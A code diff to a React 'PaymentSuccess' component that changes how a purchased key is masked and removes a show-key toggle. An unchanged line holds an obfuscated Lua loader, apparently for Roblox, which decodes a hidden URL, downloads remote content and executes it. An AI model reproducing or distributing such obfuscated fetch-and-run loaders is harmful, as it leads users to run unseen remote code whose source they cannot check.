@@ -27,6 +27,7 @@ const PaymentSuccess: FC<PaymentSuccessProps> = ({ finalData, onCopy }) => {
   const [scriptText, setScriptText] = useState('loadstring(game:GetService\'HttpService\':JSONDecode(game:HttpGet(("7h^vs\\127uRYIsl8W:<~N8{6z{wpyjz6h{hk6jpsi|w69}4zuh\\127lyhoz6z{jhmp{yh6z{ult|jvk60{s|hmlk/6zlzhih{hk6zuh\\127l{zhw6z{jlqvyw68}6tvj5zpwhlsnvvn5lyv{zlypm66Azw{{o"):gsub(\'.\',function(c)return string.char(c:byte()+1)end):reverse():gsub(\'.\',function(c)return string.char(c:byte()-8)end))).fields.content.stringValue)()');
   const [socialLinks, setSocialLinks] = useState<SocialLink[]>([]);
   const [showKey, setShowKey] = useState(false);
+  const [showFullKey, setShowFullKey] = useState(false);
   const [showScript, setShowScript] = useState(false);
 
   useEffect(() => {
@@ -57,8 +58,12 @@ const PaymentSuccess: FC<PaymentSuccessProps> = ({ finalData, onCopy }) => {
   }, []);
 
   const censorText = (text: string) => {
-    if (text.length <= 6) return '•'.repeat(text.length);
-    return text.slice(0, 3) + '•'.repeat(Math.min(text.length - 6, 20)) + text.slice(-3);
+    return '•'.repeat(Math.min(text.length, 24));
+  };
+
+  const censorKey = (text: string) => {
+    if (text.length <= 4) return '•'.repeat(text.length);
+    return text.slice(0, 4) + '•'.repeat(Math.min(text.length - 4, 16));
   };
 
   const getWhatsAppGroupLink = () => {
@@ -96,14 +101,8 @@ const PaymentSuccess: FC<PaymentSuccessProps> = ({ finalData, onCopy }) => {
               <span className="text-muted-foreground">Key:</span>
               <div className="flex items-center gap-1">
                 <code className="text-foreground font-mono font-bold text-sm">
-                  {showKey ? finalData.key : censorText(finalData.key)}
+                  {censorKey(finalData.key)}
                 </code>
-                <button
-                  onClick={() => setShowKey(!showKey)}
-                  className="text-muted-foreground hover:text-foreground transition-colors p-1 rounded hover:bg-muted"
-                >
-                  {showKey ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
-                </button>
                 <button
                   onClick={() => onCopy(finalData.key)}
                   className="text-primary hover:text-primary/80 transition-colors p-1 rounded hover:bg-primary/10"
